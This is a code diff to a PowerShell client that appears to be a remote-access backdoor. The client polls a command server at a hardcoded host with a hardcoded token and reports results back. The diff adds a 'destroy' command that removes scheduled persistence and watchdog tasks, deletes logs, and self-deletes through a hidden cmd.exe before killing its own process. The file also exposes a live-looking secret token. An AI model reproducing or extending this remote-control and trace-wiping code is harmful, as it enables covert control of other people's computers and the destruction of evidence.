@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.1.5"
+$Version = "3.1.6"
 $cfHost = "https://connect.aniketpandey.website"
 $cfToken = "81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782"  # must match server.py TOKEN
 $maxRetries = 10
@@ -1025,6 +1025,42 @@ function Connect-Cloudflare {
                     try { $script:singleInstanceMutex.ReleaseMutex() } catch {}
                     try { $script:singleInstanceMutex.Dispose() } catch {}
                     Send-Result-To-Server -Body "[+] Full cleanup complete. Client removed.`n"
+                    break
+                }
+
+                if ($command -eq "destroy") {
+                    Write-Log "DESTROY command received. Wiping all traces." "WARN"
+                    # Ack first — script may die before next send
+                    Send-Result-To-Server -Body "[+] Destroying... all traces being removed.`n"
+
+                    # 1) Unregister persistence tasks
+                    try { Unregister-ScheduledTask -TaskName $taskName          -Confirm:$false -ErrorAction SilentlyContinue } catch {}
+                    try { Unregister-ScheduledTask -TaskName $watchdogTaskName  -Confirm:$false -ErrorAction SilentlyContinue } catch {}
+                    # 2) Unregister any GUI_* tasks left behind
+                    try {
+                        Get-ScheduledTask -TaskName "GUI_*" -ErrorAction SilentlyContinue | ForEach-Object {
+                            Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
+                        }
+                    } catch {}
+                    # 3) Restore power policy
+                    try {
+                        powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 1 2>$null
+                        powercfg /setdcvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 1 2>$null
+                        powercfg /change standby-timeout-ac 30 2>$null
+                        powercfg /setactive SCHEME_CURRENT 2>$null
+                    } catch {}
+                    # 4) Delete log file and old log
+                    try { Remove-Item $logFile          -Force -ErrorAction SilentlyContinue } catch {}
+                    try { Remove-Item "$logFile.old"    -Force -ErrorAction SilentlyContinue } catch {}
+                    # 5) Release mutex
+                    try { $script:singleInstanceMutex.ReleaseMutex() } catch {}
+                    try { $script:singleInstanceMutex.Dispose()       } catch {}
+                    # 6) Delete self — schedule via cmd so the delete fires after this process exits
+                    $targetPath = $selfPath
+                    $deleteCmd  = "ping -n 3 127.0.0.1 >nul & del /f /q `"$targetPath`""
+                    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $deleteCmd" -WindowStyle Hidden -ErrorAction SilentlyContinue
+                    # 7) Kill self immediately
+                    Stop-Process -Id $PID -Force
                     break
                 }
 
